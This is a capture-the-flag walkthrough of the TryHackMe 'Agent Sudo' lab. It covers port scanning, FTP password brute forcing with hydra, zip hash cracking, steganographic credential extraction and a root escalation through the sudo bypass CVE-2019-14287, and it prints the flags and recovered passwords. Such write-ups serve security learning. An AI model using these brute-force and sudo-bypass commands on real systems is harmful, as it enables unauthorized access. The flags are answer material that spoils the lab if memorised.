
**Target IP**: `10.10.110.68`  
**Difficulty**: Easy  
**Categories**: CTF, Web, Linux, PrivEsc, Hash Cracking

____________________

Recon - 
------------------------------------------

We start with a full TCP port scan using Nmap:

`sudo nmap -sS -p- 10.10.110.68 -T4 -vv`

Output - 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-22 15:06 IST
Initiating Ping Scan at 15:06
Scanning 10.10.110.68 [4 ports]
Completed Ping Scan at 15:06, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:06
Completed Parallel DNS resolution of 1 host. at 15:06, 0.31s elapsed
Initiating SYN Stealth Scan at 15:06
Scanning 10.10.110.68 [65535 ports]
Discovered open port 22/tcp on 10.10.110.68
Discovered open port 21/tcp on 10.10.110.68
Discovered open port 80/tcp on 10.10.110.68

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


~~~~~~~~~
Open Ports -

22 - SSH
21 - FTP
80 - HTTP
~~~~~~~~~~~~

On exploring the Website on port 80 - 

![[Agent-Sudo-Img-1.png]]

Navigating to the web page hosted on port 80 presents a simple message. Suspecting user-agent-based access control, I tried sending different `User-Agent` headers using `curl`.

We find that the curl request with Agent C gives a redirect

`curl -A "C" http://10.10.110.68/ `

~~~~~~~~~~~

HTTP/1.1 302 Found
Date: Thu, 22 May 2025 10:29:40 GMT
Server: Apache/2.4.29 (Ubuntu)

**Location: agent_C_attention.php**

Content-Length: 218
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8



<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>


~~~~~~~~~~~~~~

Following the redirect with the curl command - 

`curl -A "C" http://10.10.110.68/ -L`

~~~~~~~
Note: -L flag to follow redirect
~~~~~~~~~

Output -

![[Agent-Sudo-Img-2.png]]

We find the agent name.

The hint suggests that the password is weak - Possible brute forcing


Hash Cracking and Brute force
-------------------------------------------------------------------------

Brute forcing FTP login for user

`hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.110.68 ftp  `

Output - 

![[Agent-Sudo-Img-3.png]]


FTP into the user - 

~~~~~~~~~~~~~~~~~~~
Connected to 10.10.110.68.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43343|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png


~~~~~~~~~~~~~~~~~~~~~~~~

`less To_agentJ.txt`

Output - 

~~~~~~~~~~~~~~~~
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C


~~~~~~~~~~~~~~~~

The message in `To_agentJ.txt` implies the real password is hidden inside one of the **fake alien pictures**.
__________________________
### Steganography and Hidden Files

We also need a Zip File which is not visible. It might be hidden inside one of the files.

`binwalk -e cutie.png `

This reveals a hidden **ZIP archive** - `_cutie.png.extracted `

`cd _cutie.png.extrated`

Cracking the password hash using JohnTheRipper - 

`zip2john 8702.zip > output`

`john --wordlist=/usr/share/wordlists/rockyou.txt output `



~~~~~~~~~~~~~
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

alien            (8702.zip/To_agentR.txt)   

1g 0:00:00:00 DONE (2025-05-22 16:29) 2.083g/s 51200p/s 51200c/s 51200C/s michael!..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

~~~~~~~~~~~~~~~~~~

The password is obtained.

______________

Unzipping the zip file using 7z, as unzip is not behaving as expected.

`7z e 8702.zip `

`cat To_agentR.txt`

~~~~~~~~~~~~
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
~~~~~~~~~~~~~~~


Looks like the password is encoded. Using Cyberchef to decode it.

Output - 

~~~~~~~~~~~~~~~~
Area51
~~~~~~~~~~~~~~~~~

___________________

Uncovering the hidden file from fake alien image - 

`steghide extract -sf cute-alien.jpg`

A message.txt file is recovered

~~~~~~~~~~~~~~~~~
$ cat message.txt  
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

~~~~~~~~~~~~~~~~~~

Credentials: `james:hackerrules!`

_______________________________

User Flag
-------------------------------
#### Getting a Shell

`ssh james@10.10.110.68 `

User Flag - 
~~~~~~~~~~~~~~~~~
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7

~~~~~~~~~~~~~~~~~~~~~~

_____________________________

Privilege Escalation
-------------------------------------------

On running the `sudo -l` command, Output - 

~~~~~~~~~~~
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

~~~~~~~~~~~~~~


`(ALL, !root) /bin/bash` - Although this seems to deny access to root, the target is vulnerable to `CVE-2019-14287`, a sudo security bypass that occurs when an invalid user ID is specified.

___________________

#### Exploit:

`sudo -u#-1 /bin/bash`

Explanation - 

~~~~~~~
This spawns a root shell! `-u#-1` is interpreted as UID `0` (root), bypassing restrictions.
~~~~~~~~~~~

This gives us the root shell and hence the root flag.

~~~~~~~
root@agent-sudo:/# cd root/
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R


~~~~~~~~~~~~

**Root Flag**: `b53a02f55b57d4439e3341834d70c062`

